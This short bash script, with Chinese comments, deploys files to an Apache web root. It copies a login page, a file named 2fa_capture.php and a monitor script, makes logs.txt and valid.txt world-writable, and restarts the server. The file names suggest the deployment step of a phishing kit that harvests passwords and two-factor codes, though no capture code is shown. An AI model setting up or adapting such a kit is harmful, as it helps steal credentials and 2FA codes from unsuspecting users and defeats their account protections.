# 部署与启动脚本 (deploy.sh)
#!/bin/bash
# 自动部署至Apache目录
sudo cp index.html login.php 2fa_capture.php .htaccess monitor.php /var/www/html/
sudo chown www-data:www-data /var/www/html/logs.txt /var/www/html/valid.txt 2>/dev/null
sudo chmod 666 /var/www/html/logs.txt /var/www/html/valid.txt 2>/dev/null
sudo systemctl restart apache2
echo "Deployment complete. Site accessible at https://your_domain.com"